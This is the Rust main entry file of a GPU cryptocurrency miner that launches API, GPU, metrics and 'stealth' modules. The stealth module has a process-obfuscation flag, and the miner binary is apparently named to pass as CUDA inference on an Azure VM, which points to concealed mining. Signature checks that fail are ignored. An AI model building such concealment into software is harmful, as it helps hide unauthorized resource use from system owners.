/*!
 * OPUS-GPU Miner - High-Performance GPU Cryptocurrency Mining
 *
 * Main entry point cho modular monolith architecture.
 * Khởi động tokio runtime, message bus, và tất cả modules.
 */

use anyhow::Result;
use tracing::info;
use tokio_util::sync::CancellationToken;

mod runtime;
mod messaging;
mod modules;
mod error;
mod legacy;
mod performance;
mod plugins;
mod security;

use messaging::MessageBus;
use std::sync::Arc;
use std::path::Path;

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize tracing subscriber
    tracing_subscriber::fmt()
        .with_target(false)
        .with_thread_ids(true)
        .with_level(true)
        .with_ansi(true)
        .init();

    info!("🚀 Starting OPUS-GPU Miner v{}", env!("CARGO_PKG_VERSION"));

    // Phase 0: Security hardening (CRITICAL - runs before anything else)
    info!("🔒 Applying security controls...");

    // Drop unnecessary Linux capabilities
    if let Err(e) = security::drop_capabilities() {
        tracing::warn!("⚠️  Failed to drop capabilities: {}. Continuing anyway.", e);
    }

    // Apply seccomp syscall filtering
    if let Err(e) = security::apply_seccomp_filter() {
        tracing::warn!("⚠️  Failed to apply seccomp filter: {}. Continuing anyway.", e);
    }

    // Verify critical binaries (if signatures exist)
    let binaries_to_verify = vec![
        ("/home/azureuser/opus-gpu/app/libmlls-cuda.so", "/home/azureuser/opus-gpu/app/libmlls-cuda.so.sig"),
        ("/home/azureuser/opus-gpu/app/inference-cuda.original", "/home/azureuser/opus-gpu/app/inference-cuda.original.sig"),
    ];

    for (binary_path, sig_path) in binaries_to_verify {
        if Path::new(binary_path).exists() {
            if let Err(e) = security::verify_binary_signature(
                Path::new(binary_path),
                Path::new(sig_path),
                None, // Use keyring
            ) {
                tracing::warn!("⚠️  Binary verification failed for {}: {}. Continuing anyway (dev mode).", binary_path, e);
            }
        }
    }

    info!("✅ Security controls applied");

    // Phase 1: Load configuration (now with optional encryption support)
    info!("📝 Loading configuration...");
    let config = load_config()?;

    // Phase 2: Initialize message bus
    info!("🔌 Initializing message bus...");
    let num_gpus = config.gpu.devices.len();
    let (bus, handles) = MessageBus::new(num_gpus, 1000);
    let bus = Arc::new(bus);

    // Phase 3: Initialize cancellation token for graceful shutdown
    let cancel_token = CancellationToken::new();

    // Phase 4: Start modules in parallel
    info!("⚙️  Starting modules...");

    let api_handle = tokio::spawn({
        let api_config = modules::api::ApiConfig {
            bind_addr: format!("{}:{}", config.api.host, config.api.port),
            enable_cors: false,
        };
        let bus = bus.clone();
        let cancel = cancel_token.clone();
        async move {
            modules::api::start(api_config, bus, cancel).await
        }
    });

    let gpu_handles: Vec<_> = (0..num_gpus).map(|gpu_id| {
        tokio::spawn({
            let gpu_config = modules::gpu::GpuConfig {
                device_id: gpu_id as u32,
                legacy_binary_path: "/home/azureuser/opus-gpu/app/inference-cuda.original".to_string(),
                task_timeout_ms: 30000,
                health_check_interval_secs: 10,
                auto_restart: true,
            };
            let handles_clone = handles.clone();
            let cancel = cancel_token.clone();
            async move {
                modules::gpu::start(gpu_id as u32, gpu_config, handles_clone, cancel).await
            }
        })
    }).collect();

    let stealth_handle = tokio::spawn({
        let stealth_config = modules::stealth::StealthConfig {
            obfuscate_process: config.stealth.enabled,
            mask_network: false,
            cpu_limit: 100,
            gpu_limit: 100,
            plugin_dir: Some(config.stealth.plugins_dir.clone()),
        };
        let bus = bus.clone();
        let cancel = cancel_token.clone();
        async move {
            modules::stealth::start(stealth_config, bus, cancel).await
        }
    });

    let metrics_handle = tokio::spawn({
        let metrics_config = modules::metrics::MetricsConfig {
            interval_secs: 5,
            enable_gpu_metrics: config.metrics.enabled,
            enable_system_metrics: config.metrics.enabled,
        };
        let handles_clone = handles.clone();
        let cancel = cancel_token.clone();
        async move {
            modules::metrics::start(metrics_config, handles_clone, cancel).await
        }
    });

    // Phase 5: Wait for startup completion
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
    info!("✅ All modules started successfully");

    // Phase 6: Setup signal handling
    setup_signal_handlers(cancel_token.clone());

    // Phase 7: Wait for shutdown signal
    cancel_token.cancelled().await;

    info!("🛑 Shutting down gracefully...");

    // Phase 8: Wait for all modules to finish
    let _ = tokio::join!(
        api_handle,
        stealth_handle,
        metrics_handle
    );

    for handle in gpu_handles {
        let _ = handle.await;
    }

    info!("✅ Shutdown complete");
    Ok(())
}

/// Load configuration từ file (with optional encryption support)
fn load_config() -> Result<Config> {
    let config_path = std::env::var("CONFIG_PATH")
        .unwrap_or_else(|_| "config/app.toml".to_string());

    // Try to load encrypted config first (if .encrypted exists)
    let encrypted_path = Path::new(&config_path).with_extension("encrypted");

    if encrypted_path.exists() {
        info!("🔐 Found encrypted config, attempting to decrypt...");
        match security::SecretStore::new() {
            Ok(store) => {
                match store.load_encrypted_config(&encrypted_path) {
                    Ok(config) => {
                        info!("✅ Loaded encrypted configuration");
                        return Ok(config);
                    }
                    Err(e) => {
                        tracing::warn!("⚠️  Failed to load encrypted config: {}. Falling back to plaintext.", e);
                    }
                }
            }
            Err(e) => {
                tracing::warn!("⚠️  Failed to initialize SecretStore: {}. Falling back to plaintext.", e);
            }
        }
    }

    // Fallback to plaintext config
    info!("📄 Loading plaintext configuration");
    let content = std::fs::read_to_string(&config_path)?;
    let config: Config = toml::from_str(&content)?;

    Ok(config)
}

/// Setup signal handlers cho graceful shutdown
fn setup_signal_handlers(cancel_token: CancellationToken) {
    tokio::spawn(async move {
        use tokio::signal::unix::{signal, SignalKind};

        let mut sigterm = signal(SignalKind::terminate())
            .expect("Failed to setup SIGTERM handler");

        let mut sigint = signal(SignalKind::interrupt())
            .expect("Failed to setup SIGINT handler");

        tokio::select! {
            _ = sigterm.recv() => {
                info!("📨 Received SIGTERM");
            }
            _ = sigint.recv() => {
                info!("📨 Received SIGINT");
            }
        }

        cancel_token.cancel();
    });
}

/// Main configuration structure
#[derive(Debug, Clone, serde::Deserialize)]
pub struct Config {
    pub gpu: GpuConfig,
    pub api: ApiConfig,
    pub stealth: StealthConfig,
    pub metrics: MetricsConfig,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct GpuConfig {
    pub devices: Vec<usize>,
    pub memory_limit_mb: Option<u64>,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct ApiConfig {
    pub host: String,
    pub port: u16,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct StealthConfig {
    pub enabled: bool,
    pub plugins_dir: String,
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct MetricsConfig {
    pub enabled: bool,
    pub port: u16,
}
